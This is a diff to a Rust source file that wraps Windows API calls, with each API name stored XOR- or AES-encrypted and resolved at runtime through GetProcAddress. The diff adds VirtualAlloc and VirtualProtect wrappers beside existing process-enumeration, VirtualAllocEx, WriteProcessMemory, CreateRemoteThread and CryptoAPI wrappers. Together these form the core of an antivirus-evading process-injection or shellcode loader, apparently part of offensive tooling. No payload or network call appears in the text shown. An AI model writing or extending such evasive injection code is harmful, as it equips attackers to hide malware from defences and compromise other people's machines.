@@ -169,7 +169,7 @@ pub unsafe fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> usiz
             CREATETOOLHELP32SNAPSHOT_POS,
             CREATETOOLHELP32SNAPSHOT_LEN,
         )
-        .as_slice(),
+            .as_slice(),
     ));
 
     createToolhelp32Snapshot(dwFlags, th32ProcessID)
@@ -201,6 +201,25 @@ pub unsafe fn Process32Next(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool
     process32Next(hSnapshot, lppe)
 }
 
+pub unsafe fn VirtualAlloc(
+    hProcess: usize,
+    lpAddress: usize,
+    dwSize: usize,
+    flAllocationType: u32,
+    flProtect: u32,
+) -> usize {
+    let virtualAlloc: VirtualAlloc = std::mem::transmute(GetProcAddress(
+        GetModuleHandle(get_xor_encrypted_string(
+            KERNEL32_DLL_POS,
+            KERNEL32_DLL_KEY,
+            KERNEL32_DLL_LEN,
+        )),
+        get_aes_encrypted_resource_bytes(VIRTUALALLOC_POS, VIRTUALALLOC_LEN).as_slice(),
+    ));
+
+    virtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
+}
+
 pub unsafe fn VirtualAllocEx(
     hProcess: usize,
     lpAddress: usize,
@@ -218,6 +237,24 @@ pub unsafe fn VirtualAllocEx(
     ));
 
     virtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)
+}
+
+pub unsafe fn VirtualProtect(
+    lpAddress: usize,
+    dwSize: usize,
+    flNewProtect: u32,
+    lpflOldProtect: *mut u32,
+) -> bool {
+    let virtualProtect: VirtualProtect = std::mem::transmute(GetProcAddress(
+        GetModuleHandle(get_xor_encrypted_string(
+            KERNEL32_DLL_POS,
+            KERNEL32_DLL_KEY,
+            KERNEL32_DLL_LEN,
+        )),
+        get_aes_encrypted_resource_bytes(VIRTUALPROTECT_POS, VIRTUALPROTECT_LEN).as_slice(),
+    ));
+
+    virtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
 }
 
 pub unsafe fn WriteProcessMemory(
@@ -246,7 +283,7 @@ pub unsafe fn CreateRemoteThread(
     lpStartAddress: usize,
     lpParameter: usize,
     dwCreationFlags: u32,
-    lpThreadId: usize,
+    lpThreadId: *mut u32,
 ) -> usize {
     let createRemoteThread: CreateRemoteThread = std::mem::transmute(GetProcAddress(
         GetModuleHandle(get_xor_encrypted_string(
@@ -300,7 +337,7 @@ pub unsafe fn CryptAcquireContextW(
             CRYPTACQUIRECONTEXTW_KEY,
             CRYPTACQUIRECONTEXTW_LEN,
         )
-        .as_slice(),
+            .as_slice(),
     ));
 
     cryptAcquireContextW(phProv, szContainer, szProvider, dwProvType, dwFlags)
@@ -324,7 +361,7 @@ pub unsafe fn CryptCreateHash(
             CRYPTCREATEHASH_KEY,
             CRYPTCREATEHASH_LEN,
         )
-        .as_slice(),
+            .as_slice(),
     ));
 
     cryptCreateHash(phProv, ALG_ID, hKey, dwFlags, phHash)
@@ -376,7 +413,7 @@ pub unsafe fn CryptSetKeyParam(hKey: usize, dwParam: u32, pbData: *const u8, dwF
             CRYPTSETKEYPARAM_KEY,
             CRYPTSETKEYPARAM_LEN,
         )
-        .as_slice(),
+            .as_slice(),
     ));
 
     cryptSetKeyParam(hKey, dwParam, pbData, dwFlags)
@@ -435,7 +472,7 @@ pub unsafe fn CryptReleaseContext(hProv: usize, dwFlags: u32) -> bool {
             CRYPTRELEASECONTEXT_KEY,
             CRYPTRELEASECONTEXT_LEN,
         )
-        .as_slice(),
+            .as_slice(),
     ));
 
     cryptReleaseContext(hProv, dwFlags)
@@ -453,7 +490,7 @@ pub unsafe fn CryptDestroyKey(hKey: usize) -> bool {
             CRYPTDESTROYKEY_KEY,
             CRYPTDESTROYKEY_LEN,
         )
-        .as_slice(),
+            .as_slice(),
     ));
 
     cryptDestroyKey(hKey)
@@ -471,7 +508,7 @@ pub unsafe fn CryptDestroyHash(hHash: usize) -> bool {
             CRYPTDESTROYHASH_KEY,
             CRYPTDESTROYHASH_LEN,
         )
-        .as_slice(),
+            .as_slice(),
     ));
 
     cryptDestroyHash(hHash)
@@ -501,3 +538,4 @@ pub unsafe fn MessageBoxA(hWnd: usize, lpText: *const u8, lpCaption: *const u8, 
 
     messageBoxA(hWnd, lpText, lpCaption, uType)
 }
+
